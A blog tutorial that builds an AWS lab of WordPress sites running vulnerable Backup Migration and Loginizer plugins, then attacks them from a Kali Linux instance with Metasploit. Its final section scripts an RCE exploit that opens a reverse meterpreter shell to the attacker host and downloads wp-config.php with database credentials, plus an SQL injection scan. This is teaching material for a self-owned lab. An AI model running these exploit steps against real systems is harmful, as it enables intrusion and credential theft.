---
title: Exploit vulnerability in a WordPress plugin with Kali Linux 2
author: Petr Ruzicka
date: 2024-05-09
description: Learn how to exploit a vulnerability in a WordPress plugin running on EC2 using Kali Linux
categories: [Security, Exploit, Vulnerability, Kali Linux, EC2, Docker, Amazon ECS]
tags:
  [
    EC2,
    docker,
    container,
    security,
    Kali Linux,
    exploit,
    vulnerability,
    WordPress,
    plugin,
    Amazon ECS,
    SQLi,
  ]
image: https://media.githubusercontent.com/media/openutd/openutd.github.io/e006b3c723e203399f4099045e937e1ca820a7f7/slides/assets/kali_linux.png
---

For educational purposes, it can be useful to learn how to exploit Remote Code
Execution (RCE) and SQL Injection (SQLi) vulnerabilities in a WordPress plugin
using Kali Linux.

I will cover the following steps:

- Install an Amazon ECS cluster and create two EC2 instances (one standalone and
  one with Docker)
- Install WordPress and a vulnerable WordPress plugin to ECS, Docker, and a
  standalone EC2 instance
- Create an EC2 instance with Kali Linux (and install Metasploit on it) to
  serve as the attacker machine
- Exploit vulnerabilities in a WordPress plugin using Kali Linux and
  Metasploit

## Set necessary environment variables and download CloudFormation templates

Requirements:

- [AWS CLI](https://aws.amazon.com/cli/)
- [Colima](https://github.com/abiosoft/colima) / [Docker](https://www.docker.com/)
  / [Rancher Desktop](https://rancherdesktop.io/) / ...
- [copilot](https://github.com/aws/copilot-cli)

Set the required environment variables:

```shell
export AWS_ACCESS_KEY_ID="xxxxxxxxxxxxxxxxxx"
export AWS_SECRET_ACCESS_KEY="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
```

```bash
export AWS_REGION="eu-central-1"
AWS_EC2_KEY_PAIR_NAME="wordpress-test"
TMP_DIR="${TMP_DIR:-${PWD}}"
WORDPRESS_USERNAME="wordpress"
WORDPRESS_PASSWORD=$(openssl rand -base64 12)
MARIADB_WORDPRESS_DATABASE="wordpress"
MARIADB_WORDPRESS_DATABASE_USER="wordpress"
MARIADB_WORDPRESS_DATABASE_PASSWORD=$(openssl rand -base64 12)
MARIADB_ROOT_PASSWORD=$(openssl rand -base64 12)
```

Download the CloudFormation templates for the [VPC](https://github.com/aws-samples/aws-codebuild-samples/blob/e43fe99f21b02635873bddeed92b669e8e5156d3/ci_tools/vpc_cloudformation_template.yml),
[Kali Linux](https://github.com/aws-samples/amazon-ec2-nice-dcv-samples/blob/16b1251185f1f91764c1bb1c7e79d6595e7d36ce/cfn/KaliLinux-NICE-DCV.yaml),
[Ubuntu (Docker EC2)](https://github.com/aws-samples/ec2-lamp-server/blob/c2b64d97229a223dd5f5f38fd3f9660a8011f050/UbuntuLinux-2204-LAMP-server.yaml),
and [AmazonLinux-2023 (standalone EC2)](https://github.com/aws-samples/ec2-lamp-server/blob/c2b64d97229a223dd5f5f38fd3f9660a8011f050/AmazonLinux-2023-LAMP-server.yaml)
instances:

```bash
# renovate: currentValue=master
wget --continue -q -P "${TMP_DIR}" https://raw.githubusercontent.com/aws-samples/aws-codebuild-samples/00284b828a360aa89ac635a44d84c5a748af03d3/ci_tools/vpc_cloudformation_template.yml
# renovate:
wget --continue -q -P "${TMP_DIR}" https://raw.githubusercontent.com/aws-samples/amazon-ec2-nice-dcv-samples/3cb54467cf4c58bace2f949a704871f9bc0e5af5/cfn/KaliLinux-NICE-DCV.yaml
# renovate:
wget --continue -q -P "${TMP_DIR}" https://raw.githubusercontent.com/aws-samples/ec2-lamp-server/c0ec2481d4995771422304b05b7b90bd701052f2/UbuntuLinux-2204-LAMP-server.yaml
# renovate:
wget --continue -q -P "${TMP_DIR}" https://raw.githubusercontent.com/aws-samples/ec2-lamp-server/c0ec2481d4995771422304b05b7b90bd701052f2/AmazonLinux-2023-LAMP-server.yaml
```

Create a new AWS EC2 Key Pair to be used for the EC2 instances:

```bash
aws ec2 create-key-pair --key-name "${AWS_EC2_KEY_PAIR_NAME}" --key-type ed25519 --query "KeyMaterial" --output text > "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem"
chmod 600 "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem"
```

## Run Kali Linux on Amazon EC2 instance

![Kali Linux](https://user-images.githubusercontent.com/45159366/128566095-253303e2-25d8-42f1-a06d-0b38ca079a1a.png){:width="600"}

Create an AWS EC2 instance with [Kali Linux](https://www.kali.org/) using the
CloudFormation template:

```bash
export SOLUTION_KALI="KaliLinux-NICE-DCV"

aws cloudformation deploy --capabilities CAPABILITY_IAM \
  --parameter-overrides "EnvironmentName=${SOLUTION_KALI}" \
  --stack-name "${SOLUTION_KALI}-VPC" --template-file "${TMP_DIR}/vpc_cloudformation_template.yml" \
  --tags "Owner=${USER} Environment=dev Solution=${SOLUTION_KALI}"

AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name "${SOLUTION_KALI}-VPC" --query "Stacks[0].Outputs[? OutputKey==\`PublicSubnet1\` || OutputKey==\`VPC\`].{OutputKey:OutputKey,OutputValue:OutputValue}")
AWS_VPC_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"VPC\") .OutputValue")
AWS_SUBNET_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"PublicSubnet1\") .OutputValue")

eval aws cloudformation create-stack --capabilities CAPABILITY_AUTO_EXPAND CAPABILITY_IAM --on-failure DO_NOTHING \
  --parameters "ParameterKey=ec2KeyPair,ParameterValue=${AWS_EC2_KEY_PAIR_NAME} ParameterKey=vpcID,ParameterValue=${AWS_VPC_ID} ParameterKey=subnetID,ParameterValue=${AWS_SUBNET_ID} ParameterKey=allowWebServerPorts,ParameterValue=HTTP-and-HTTPS" \
  --stack-name "${SOLUTION_KALI}" --template-body "file://${TMP_DIR}/KaliLinux-NICE-DCV.yaml" \
  --tags "Key=Owner,Value=${USER} Key=Environment,Value=dev Key=Solution,Value=${SOLUTION_KALI}"
```

## Build EC2 instances with Wordpress Application

Let's look at how to build an EC2 instance with a vulnerable WordPress
application.

### Create new EC2 instance with Wordpress in Container

Build a new Ubuntu Linux 22.04 EC2 instance:

```bash
export SOLUTION_EC2_CONTAINER="Amazon-EC2-Container"

aws cloudformation deploy \
  --parameter-overrides "EnvironmentName=${SOLUTION_EC2_CONTAINER}" \
  --stack-name "${SOLUTION_EC2_CONTAINER}-VPC" --template-file "${TMP_DIR}/vpc_cloudformation_template.yml" \
  --tags "Owner=${USER} Environment=dev Solution=${SOLUTION_EC2_CONTAINER}"

AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name "${SOLUTION_EC2_CONTAINER}-VPC" --query "Stacks[0].Outputs[? OutputKey==\`PublicSubnet1\` || OutputKey==\`VPC\`].{OutputKey:OutputKey,OutputValue:OutputValue}")
AWS_VPC_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"VPC\") .OutputValue")
AWS_SUBNET_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"PublicSubnet1\") .OutputValue")

eval aws cloudformation deploy --capabilities CAPABILITY_IAM \
  --parameter-overrides "instanceType=t4g.medium ec2Name=${SOLUTION_EC2_CONTAINER} ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME} vpcID=${AWS_VPC_ID} subnetID=${AWS_SUBNET_ID} webOption=none databaseOption=none phpVersion=none" \
  --stack-name "${SOLUTION_EC2_CONTAINER}" --template-file "${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml" \
  --tags "Owner=${USER} Environment=dev Solution=${SOLUTION_EC2_CONTAINER}"

AWS_EC2_CONTAINER_PUBLIC_IP=$(aws ec2 describe-instances --filters "Name=tag:Solution,Values=${SOLUTION_EC2_CONTAINER}" --query "Reservations[].Instances[].PublicIpAddress" --output text)
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}" 'curl -Ls https://github.com/ruzickap.keys >> ~/.ssh/authorized_keys'
```

Install Docker and [Docker Compose](https://docs.docker.com/compose/) on the
instance:

```bash
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}" << \EOF
set -euxo pipefail
sudo dnf install -qy docker
sudo usermod -aG docker ec2-user
sudo systemctl enable --now docker
sudo mkdir -p /usr/local/lib/docker/cli-plugins
sudo curl -sL https://github.com/docker/compose/releases/latest/download/docker-compose-linux-$(uname -m) -o /usr/local/lib/docker/cli-plugins/docker-compose
sudo chown root:root /usr/local/lib/docker/cli-plugins/docker-compose
sudo chmod +x /usr/local/lib/docker/cli-plugins/docker-compose
EOF
```

Install WordPress in a container with the vulnerable
[WordPress Backup Migration Plugin](https://wordpress.org/plugins/backup-backup/)
and [Loginizer](https://wordpress.org/plugins/loginizer/) plugins:

![Wordpress](https://user-images.githubusercontent.com/6468571/183256208-c68f8f50-d0fd-4dde-85ad-7e2ea828f78e.png){:width="400"}

```bash
# shellcheck disable=SC2087
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_CONTAINER_PUBLIC_IP}" << EOF2
set -euxo pipefail
mkdir -p docker-entrypoint-init.d
cat > docker-entrypoint-init.d/wordpress_plugin_install.sh << EOF
wp plugin install backup-backup --version=1.3.7 --activate
wp plugin install loginizer --version=1.6.3 --activate
EOF
chmod a+x docker-entrypoint-init.d/wordpress_plugin_install.sh

cat > docker-compose.yml << EOF
services:
  mariadb:
    # renovate: datasource=docker depName=bitnami/mariadb
    image: docker.io/bitnami/mariadb:11.2
    volumes:
      - 'mariadb_data:/bitnami/mariadb'
    environment:
      - ALLOW_EMPTY_PASSWORD=no
      - MARIADB_USER=${MARIADB_WORDPRESS_DATABASE_USER}
      - MARIADB_DATABASE=${MARIADB_WORDPRESS_DATABASE}
      - MARIADB_PASSWORD=${MARIADB_WORDPRESS_DATABASE_PASSWORD}
      - MARIADB_ROOT_PASSWORD=${MARIADB_ROOT_PASSWORD}
  wordpress:
    image: docker.io/bitnami/wordpress:6
    ports:
      - '80:8080'
      - '443:8443'
    volumes:
      - 'wordpress_data:/bitnami/wordpress'
      - '\${PWD}/docker-entrypoint-init.d:/docker-entrypoint-init.d'
    depends_on:
      - mariadb
    environment:
      - ALLOW_EMPTY_PASSWORD=no
      - WORDPRESS_USERNAME=${WORDPRESS_USERNAME}
      - WORDPRESS_PASSWORD=${WORDPRESS_PASSWORD}
      - WORDPRESS_DATABASE_HOST=mariadb
      - WORDPRESS_DATABASE_PORT_NUMBER=3306
      - WORDPRESS_DATABASE_USER=${MARIADB_WORDPRESS_DATABASE_USER}
      - WORDPRESS_DATABASE_PASSWORD=${MARIADB_WORDPRESS_DATABASE_PASSWORD}
      - WORDPRESS_DATABASE_NAME=${MARIADB_WORDPRESS_DATABASE}
volumes:
  mariadb_data:
    driver: local
  wordpress_data:
    driver: local
EOF

docker compose up --quiet-pull -d
EOF2
```

The vulnerable plugins, [WordPress Backup Migration Plugin 1.3.7](https://github.com/rapid7/metasploit-framework/blob/6d8666e35b96b3c16e63acb57381b5efdcafb0d0/documentation/modules/exploit/multi/http/wp_backup_migration_php_filter.md)
and [Loginizer 1.6.3](https://github.com/rapid7/metasploit-framework/blob/980230e5f1b8b34656f75eda1d5fde47cfd9866c/documentation/modules/auxiliary/scanner/http/wp_loginizer_log_sqli.md),
were installed.

Summarize the WordPress URL, Admin URL, Username, and Password:

```shell
echo "WordPress URL: http://${AWS_EC2_CONTAINER_PUBLIC_IP}/"
echo "WordPress Admin URL: http://${AWS_EC2_CONTAINER_PUBLIC_IP}/admin"
echo -e "Username: ${WORDPRESS_USERNAME}\nPassword: ${WORDPRESS_PASSWORD}"
```

### Create new EC2 instance with Wordpress

Build a new Amazon Linux 2023 EC2 instance for a standalone WordPress
installation:

```bash
export SOLUTION_EC2="Amazon-EC2"

aws cloudformation deploy \
  --parameter-overrides "EnvironmentName=${SOLUTION_EC2}" \
  --stack-name "${SOLUTION_EC2}-VPC" --template-file "${TMP_DIR}/vpc_cloudformation_template.yml" \
  --tags "Owner=${USER} Environment=dev Solution=${SOLUTION_EC2}"

AWS_CLOUDFORMATION_DETAILS=$(aws cloudformation describe-stacks --stack-name "${SOLUTION_EC2}-VPC" --query "Stacks[0].Outputs[? OutputKey==\`PublicSubnet1\` || OutputKey==\`VPC\`].{OutputKey:OutputKey,OutputValue:OutputValue}")
AWS_VPC_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"VPC\") .OutputValue")
AWS_SUBNET_ID=$(echo "${AWS_CLOUDFORMATION_DETAILS}" | jq -r ".[] | select(.OutputKey==\"PublicSubnet1\") .OutputValue")

eval aws cloudformation deploy --capabilities CAPABILITY_IAM \
  --parameter-overrides "instanceType=t4g.medium ec2Name=${SOLUTION_EC2} ec2KeyPair=${AWS_EC2_KEY_PAIR_NAME} vpcID=${AWS_VPC_ID} subnetID=${AWS_SUBNET_ID}" \
  --stack-name "${SOLUTION_EC2}" --template-file "${TMP_DIR}/AmazonLinux-2023-LAMP-server.yaml" \
  --tags "Owner=${USER} Environment=dev Solution=${SOLUTION_EC2}"

AWS_EC2_PUBLIC_IP=$(aws ec2 describe-instances --filters "Name=tag:Solution,Values=${SOLUTION_EC2}" --query "Reservations[].Instances[].PublicIpAddress" --output text)
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_PUBLIC_IP}" 'curl -Ls https://github.com/ruzickap.keys >> ~/.ssh/authorized_keys'
```

Configure MariaDB and add a `wordpress` user with a password:

![MariaDB](https://raw.githubusercontent.com/openshift-integration/kamelet-catalog/2b1264daa55eea1ef4854bd39573d334831cfd27/docs/modules/ROOT/assets/images/kamelets/mariadb-source.svg)

```bash
# shellcheck disable=SC2087
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_PUBLIC_IP}" << EOF2
sudo mysql --user=root << \EOF
UPDATE mysql.global_priv SET priv=json_set(priv, '$.plugin', 'mysql_native_password', '$.authentication_string', PASSWORD('${MARIADB_ROOT_PASSWORD}')) WHERE User='root';
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
DELETE FROM mysql.global_priv WHERE User='';
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';
CREATE USER '${MARIADB_WORDPRESS_DATABASE_USER}'@'localhost' IDENTIFIED BY '${MARIADB_WORDPRESS_DATABASE_PASSWORD}';
GRANT ALL PRIVILEGES ON ${MARIADB_WORDPRESS_DATABASE}.* TO '${MARIADB_WORDPRESS_DATABASE_USER}'@'localhost';
FLUSH PRIVILEGES;
EOF
EOF2
```

Install WordPress with the vulnerable [WordPress Backup Migration Plugin](https://wordpress.org/plugins/backup-backup/)
and [Loginizer](https://wordpress.org/plugins/loginizer/) plugins:

```bash
# shellcheck disable=SC2087
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "ec2-user@${AWS_EC2_PUBLIC_IP}" << EOF
set -euxo pipefail
wget -q https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
chmod +x wp-cli.phar
sudo mv wp-cli.phar /usr/local/bin/wp
cd /var/www/html/
wp core download --version=6.5.3
wp config create --dbname="${MARIADB_WORDPRESS_DATABASE}" --dbuser="${MARIADB_WORDPRESS_DATABASE_USER}" --dbpass="${MARIADB_WORDPRESS_DATABASE_PASSWORD}"
wp db create
wp core install --url="${AWS_EC2_PUBLIC_IP}" --title="My Blog" --admin_user="${WORDPRESS_USERNAME}" --admin_password="${WORDPRESS_PASSWORD}" --skip-email --admin_email="info@example.com"
wp plugin install backup-backup --version=1.3.7 --activate
wp plugin install loginizer --version=1.6.3 --activate
EOF
```

Summarize the WordPress URL, Admin URL, Username, and Password:

```shell
echo "WordPress URL: http://${AWS_EC2_PUBLIC_IP}/"
echo "WordPress Admin URL: http://${AWS_EC2_PUBLIC_IP}/wp-admin/"
echo -e "Username: ${WORDPRESS_USERNAME}\nPassword: ${WORDPRESS_PASSWORD}"
```

## Create ECS cluster with Wordpress

![Amazon ECS](https://raw.githubusercontent.com/cellinlab/logos/0557e31ed335e38f7fed1fb6c9081221fea7873d/logos/aws-ecs.svg){:width="150"}

Prepare the `wordpress_plugin_install.sh` startup script. This script will be
used to install the vulnerable [WordPress Backup Migration Plugin](https://wordpress.org/plugins/backup-backup/)
and [Loginizer](https://wordpress.org/plugins/loginizer/) plugins during
container startup:

```bash
cd "${TMP_DIR}" || exit
cat > wordpress_plugin_install.sh << EOF
wp plugin install backup-backup --version=1.3.7 --activate
wp plugin install loginizer --version=1.6.3 --activate
EOF
chmod a+x wordpress_plugin_install.sh
```

Create the `startup.sh` script. This script will populate environment variables
for the `bitnami/wordpress` container based on the `WORDPRESSCLUSTER_SECRET`
produced by Copilot:

```bash
cat > startup.sh << \EOF
#!/bin/sh

# Exit if the secret wasn't populated by the ECS agent
if [ -z "${WORDPRESSCLUSTER_SECRET}" ]; then
  echo "Environment variable "WORDPRESSCLUSTER_SECRET" with secrets is not populated in environment !!!"
  echo 'It should look like: {"host":"mariadb","port":3306,"dbname":"wordpress","username":"wordpress","password":"password"}'
  exit 1
fi

export WORDPRESS_DATABASE_HOST=$(echo "${WORDPRESSCLUSTER_SECRET}" | jq -r '.host')
export WORDPRESS_DATABASE_PORT_NUMBER=$(echo "${WORDPRESSCLUSTER_SECRET}" | jq -r '.port')
export WORDPRESS_DATABASE_NAME=$(echo "${WORDPRESSCLUSTER_SECRET}" | jq -r '.dbname')
export WORDPRESS_DATABASE_USER=$(echo "${WORDPRESSCLUSTER_SECRET}" | jq -r '.username')
export WORDPRESS_DATABASE_PASSWORD=$(echo "${WORDPRESSCLUSTER_SECRET}" | jq -r '.password')

/opt/bitnami/scripts/wordpress/entrypoint.sh /opt/bitnami/scripts/apache/run.sh
EOF
chmod a+x startup.sh
```

Prepare the `Dockerfile`. This file defines how to install `jq` into the
[Bitnami WordPress image](https://github.com/bitnami/containers/tree/main/bitnami/wordpress)
and uses the `startup.sh` script to start the container:

```bash
cat > Dockerfile << \EOF
FROM docker.io/bitnami/minideb:bookworm as installer
RUN set -eux && \
    apt-get update -q && \
    apt-get install curl -y -q && \
    curl -sLo /usr/local/bin/jq https://github.com/stedolan/jq/releases/download/jq-1.5/jq-linux64 && \
    chmod a+x /usr/local/bin/jq

FROM docker.io/bitnami/wordpress:latest as app
COPY --from=installer /usr/local/bin/jq /usr/bin/jq
COPY startup.sh /opt/copilot/scripts/startup.sh
COPY wordpress_plugin_install.sh /docker-entrypoint-init.d/

ENTRYPOINT ["/bin/sh", "-c"]
CMD ["/opt/copilot/scripts/startup.sh"]
EXPOSE 8080
EOF
```

Initialize the backend application with Copilot:

![Copilot CLI](https://raw.githubusercontent.com/aws/copilot-cli/4a1498b4973366c0fde88c5922c61ee3b142855a/site/content/assets/images/copilot-logo-48-light.svg){:width="150"}

```bash
copilot app init wordpress --resource-tags "Owner=${USER},Environment=dev,Solution=Amazon-ECS"
```

Create a development environment for the application:

```bash
copilot env init --name dev --default-config
```

Set up the required infrastructure to run our containerized application.
Copilot will now proceed to create the VPC, Public Subnets, Private Subnets,
a Route53 Private Hosted Zone for service discovery, a custom route table, a
Security Group for inter-container communication, and an ECS Cluster to group
the ECS services:

```bash
copilot env deploy --name dev
```

Create WordPress secrets as SecureString parameters in SSM Parameter Store:

```bash
copilot secret init --name WORDPRESS_USERNAME --values "dev=${WORDPRESS_USERNAME}" --overwrite
copilot secret init --name WORDPRESS_PASSWORD --values "dev=${WORDPRESS_PASSWORD}" --overwrite
```

Start Docker Desktop or Colima if you are a macOS user:

```shell
colima start
```

Create a manifest file that defines your backend service:

```bash
copilot svc init --dockerfile Dockerfile \
  --name wordpress --port 8080 --svc-type 'Load Balanced Web Service'
```

Add references to the secrets in `copilot/wordpress/manifest.yml`:

```bash
cat >> copilot/wordpress/manifest.yml << EOF

secrets:
  WORDPRESS_USERNAME: /copilot/wordpress/dev/secrets/WORDPRESS_USERNAME
  WORDPRESS_PASSWORD: /copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD
EOF
```

Create an Aurora DB to be used by the backend service:

```bash
copilot storage init --name wordpress-cluster --lifecycle=workload \
  --storage-type Aurora --engine MySQL --initial-db "${MARIADB_WORDPRESS_DATABASE}"
```

Deploy the backend service:

```bash
copilot svc deploy --resource-tags "Owner=${USER},Environment=dev,Solution=Amazon-ECS"
```

Get the details of the deployed service:

```bash
COPILOT_PUBLIC_IP=$(copilot svc show --name wordpress --json | jq -r '.routes[].url')
copilot svc show --name wordpress
```

```console
About

  Application  wordpress
  Name         wordpress
  Type         Load Balanced Web Service

Configurations

  Environment  Tasks     CPU (vCPU)  Memory (MiB)  Platform      Port
  -----------  -----     ----------  ------------  --------      ----
  dev          1         0.25        512           LINUX/X86_64  8080

Routes

  Environment  URL
  -----------  ---
  dev          http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com

Internal Service Endpoints

  Endpoint                            Environment  Type
  --------                            -----------  ----
  wordpress:8080                      dev          Service Connect
  wordpress.dev.wordpress.local:8080  dev          Service Discovery

Variables

  Name                                Container  Environment  Value
  ----                                ---------  -----------  -----
  COPILOT_APPLICATION_NAME            wordpress  dev          wordpress
  COPILOT_ENVIRONMENT_NAME              "          "          dev
  COPILOT_LB_DNS                        "          "          wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com
  COPILOT_SERVICE_DISCOVERY_ENDPOINT    "          "          dev.wordpress.local
  COPILOT_SERVICE_NAME                  "          "          wordpress
  WORDPRESSCLUSTER_SECURITY_GROUP       "          "          sg-0877803062b02c1ac

Secrets

  Name                     Container  Environment  Value From
  ----                     ---------  -----------  ----------
  WORDPRESSCLUSTER_SECRET  wordpress  dev          arn:aws:secretsmanager:eu-central-1:729560437327:secret:wordpressclusterAuroraSecre-2q9Fj1KRUkQL-VV3pqy
  WORDPRESS_PASSWORD         "          "          parameter//copilot/wordpress/dev/secrets/WORDPRESS_PASSWORD
  WORDPRESS_USERNAME         "          "          parameter//copilot/wordpress/dev/secrets/WORDPRESS_USERNAME
```

Summarize the WordPress URL, Admin URL, Username and Password:

```shell
echo "WordPress URL: ${COPILOT_PUBLIC_IP}/"
echo "WordPress Admin URL: ${COPILOT_PUBLIC_IP}/wp-admin/"
echo -e "Username: ${WORDPRESS_USERNAME}\nPassword: ${WORDPRESS_PASSWORD}"
```

Handy ECS links:

- [Build Efficient CI/CD Pipelines for Connected Microservices in Under an Hour Using AWS Copilot](https://community.aws/content/2djhTaf6woZwSQPAEt94ScYWWDv/ci-cd-pipelines-for-two-connected-services-using-aws-copilot?lang=en)
- [Wordpress on Copilot](https://github.com/bvtujo/copilot-wordpress)

## Attack the Wordpress Application

The following part describes using the Metasploit Framework to exploit
vulnerabilities in the [WordPress Backup Migration Plugin](https://wordpress.org/plugins/backup-backup/)
and [Loginizer](https://wordpress.org/plugins/loginizer/) plugins.

Details about the WordPress plugin vulnerabilities can be found here:

- [WordPress Backup Migration Plugin](https://wordpress.org/plugins/backup-backup/)
  - [WordPress Backup Migration Plugin PHP Filter Chain RCE](https://www.rapid7.com/db/modules/exploit/multi/http/wp_backup_migration_php_filter/)
  - [Vulnerability Details : CVE-2023-6553](https://www.cvedetails.com/cve/CVE-2023-6553/)
  - [CVE-2023-6553 Exploit V2](https://github.com/Chocapikk/CVE-2023-6553)
  - [CVE-2023-6553 Detail](https://nvd.nist.gov/vuln/detail/CVE-2023-6553)
  - [Unauth RCE in the WordPress plugin: Backup Migration (<= 1.3.7)](https://github.com/rapid7/metasploit-framework/blob/6d8666e35b96b3c16e63acb57381b5efdcafb0d0/documentation/modules/exploit/multi/http/wp_backup_migration_php_filter.md)
- [Loginizer](https://wordpress.org/plugins/loginizer/)
  - [WordPress Loginizer log SQLi Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_loginizer_log_sqli/)
  - [Vulnerability Details : CVE-2020-27615](https://www.cvedetails.com/cve/CVE-2020-27615/)
  - [CVE-2020-27615 Detail](https://nvd.nist.gov/vuln/detail/CVE-2020-27615)
  - [Loginizer timebased SQL injection in versions before 1.6.4](https://github.com/rapid7/metasploit-framework/blob/980230e5f1b8b34656f75eda1d5fde47cfd9866c/documentation/modules/auxiliary/scanner/http/wp_loginizer_log_sqli.md)

Log in to the Kali Linux instance using SSH and perform the following steps:

- Use the `wp_backup_migration_php_filter` and `wp_loginizer_log_sqli`
  Metasploit modules to exploit the WordPress plugin vulnerabilities
- Execute `sysinfo` to get details about the remote system
- Download the WordPress config file `wp-config.php`, which contains database
  credentials

Allow your user to connect to the Kali Linux instance using SSH and then
install Metasploit:

```bash
AWS_EC2_KALI_LINUX_PUBLIC_IP=$(aws ec2 describe-instances --filters "Name=tag:Solution,Values=${SOLUTION_KALI}" --query "Reservations[].Instances[].PublicIpAddress" --output text)
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}" 'curl -Ls https://github.com/ruzickap.keys >> ~/.ssh/authorized_keys'
scp -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}":~
ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}" << EOF
touch ~/.hushlogin
sudo snap install metasploit-framework
msfdb init
EOF
```

![Metasploit](https://user-images.githubusercontent.com/63872951/187396388-1c15dd6e-95a0-438a-ada5-71e49ff17f4e.jpg){:width="500"}
_Metasploit logo_

Run the Metasploit Framework and exploit the vulnerability in all three
environments (ECS, EC2 with Docker, and a standalone EC2 instance):

```bash
# shellcheck disable=SC2087
for PUBLIC_IP in ${COPILOT_PUBLIC_IP} ${AWS_EC2_CONTAINER_PUBLIC_IP} ${AWS_EC2_PUBLIC_IP}; do
  echo "*** ${PUBLIC_IP}"
  ssh -i "${TMP_DIR}/${AWS_EC2_KEY_PAIR_NAME}.pem" -o StrictHostKeyChecking=no "kali@${AWS_EC2_KALI_LINUX_PUBLIC_IP}" << EOF2
cat << EOF | msfconsole --quiet --resource -
use exploit/multi/http/wp_backup_migration_php_filter
set rhost ${PUBLIC_IP}
set lhost ${AWS_EC2_KALI_LINUX_PUBLIC_IP}
set lport 443
run --no-interact
sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo \
  --meterpreter-command "download /bitnami/wordpress/wp-config.php"
use auxiliary/scanner/http/wp_loginizer_log_sqli
set rhost ${PUBLIC_IP}
set verbose true
run
exit -y
EOF
EOF2
done
```

The output below was shortened, showing only the attack against WordPress on
Amazon ECS:

```console
*** http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com

 ** Welcome to Metasploit Framework Initial Setup **
    Please answer a few questions to get started.



 ** Metasploit Framework Initial Setup Complete **

Running the 'init' command for the database:
Existing database found, attempting to start it
Starting database at /home/kali/snap/metasploit-framework/common/.msf4/db...server starting
success
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
[*] Processing stdin for ERB directives.
resource (stdin)> use exploit/multi/http/wp_backup_migration_php_filter
[*] Using configured payload php/meterpreter/reverse_tcp

resource (stdin)> set rhost http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com
rhost => http://wordpr-Publi-BpPriJDxXb94-436714884.eu-central-1.elb.amazonaws.com

resource (stdin)> set lhost 18.185.154.248
lhost => 18.185.154.248

resource (stdin)> set lport 443
lport => 443

resource (stdin)> run --no-interact
[*] Exploiting target 18.158.31.183
[-] Handler failed to bind to 18.185.154.248:443:-  -
[*] Started reverse TCP handler on 0.0.0.0:443
[*] Running automatic check ("set AutoCheck false" to disable)
[*] WordPress Version: 6.5.3
[+] Detected Backup Migration Plugin version: 1.3.7
[+] The target appears to be vulnerable.
[*] Writing the payload to disk, character by character, please wait...
[*] Sending stage (39927 bytes) to 3.71.92.221
[+] Deleted Y
[+] Deleted pLqV.php
[*] Meterpreter session 1 opened (10.192.10.69:443 -> 3.71.92.221:40930) at 2024-06-01 18:18:03 +0000
[*] Session 1 created in the background.
[*] Exploiting target 18.194.82.16
[-] Handler failed to bind to 18.185.154.248:443:-  -
[*] Started reverse TCP handler on 0.0.0.0:443
[*] Running automatic check ("set AutoCheck false" to disable)
[*] WordPress Version: 6.5.3
[+] Detected Backup Migration Plugin version: 1.3.7
[+] The target appears to be vulnerable.
[*] Writing the payload to disk, character by character, please wait...
[*] Sending stage (39927 bytes) to 3.71.92.221
[+] Deleted d
[+] Deleted pLqV.php
[*] Meterpreter session 2 opened (10.192.10.69:443 -> 3.71.92.221:35022) at 2024-06-01 18:19:07 +0000
[*] Session 2 created in the background.

resource (stdin)> sessions --interact 1 --meterpreter-command ps --meterpreter-command sysinfo   --meterpreter-command "download /bitnami/wordpress/wp-config.php"
[*] Running 'ps' on meterpreter session 1 (18.158.31.183)

Process List
============

 PID  Name                                              User  Path
 ---  ----                                              ----  ----
